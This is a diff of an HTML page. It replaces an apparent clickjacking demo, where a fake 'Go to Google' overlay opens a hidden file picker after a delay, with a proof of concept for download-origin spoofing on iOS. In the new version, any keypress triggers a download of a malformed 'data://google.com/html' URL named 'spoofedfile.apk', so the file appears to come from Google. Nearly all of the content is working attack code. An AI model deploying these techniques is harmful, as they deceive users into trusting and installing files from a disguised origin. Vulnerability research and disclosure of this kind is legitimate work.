@@ -1,68 +1,38 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        h1 {
-            margin: 1em;
-            text-align: center;
-        }
-        a {
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: rgba(0, 0, 0, 0.5);
-            text-decoration: none;
-            color: white;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 24px;
-        }
-        input[type="file"] {
-            display: none;
-        }
-        img {
-            width: 100%;
-            height: auto;
-            display: block;
-            margin-top: 20px;
-        }
-    </style>
-    <title>Tap to Upload Photo</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Download & Origin Spoofing on iOS</title>
 </head>
 <body>
-    <h1>Tap to Upload Photo to Google</h1>
+  <center><h2>PoC for Download Origin Spoofing on iOS</h2></center>
 
-    <input id="fileSelect" type="file" accept="image/*" />
+  <script>
+    // Listen for a keydown event to trigger download
+    window.addEventListener('keydown', function(e) {
+      openDownload();
+    });
 
-    <img id="img" src="" alt="Your selected image will appear here.">
+    // Function to trigger the download using the malformed data URL
+    function openDownload() {
+      // The 'data://google.com/html,somepayload' is a malformed data URL
+      // You can replace 'somepayload' with any string or base64-encoded content
+      const payload = "somepayload"; // Change this to any custom payload you need
+      initiateDownload("data://google.com/html," + encodeURIComponent(payload), "spoofedfile.apk");
+    }
 
-    <a id="link" href="https://google.com" target="_top">Go to Google</a>
+    // Helper function to initiate the download
+    function initiateDownload(uri, name) {
+      const link = document.createElement("a");
+      link.href = uri;
+      link.download = name;
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+  </script>
 
-    <script>
-        // Trigger the file input click with a delay when the link is clicked
-        document.getElementById('link').onclick = function(event) {
-            event.preventDefault(); // Prevent the link from opening immediately
-            
-            // Set a delay (500 milliseconds in this case)
-            setTimeout(function() {
-                document.getElementById('fileSelect').click();
-            }, 460); // 500ms delay
-        };
-
-        // When the user selects a file, show the image
-        document.getElementById('fileSelect').onchange = function(event) {
-            let img = document.getElementById('img');
-            img.src = URL.createObjectURL(event.target.files[0]);
-        };
-    </script>
+  <p>Press any key to start the download. The payload is: <code>somepayload</code></p>
 </body>
 </html>
-
-
-
-
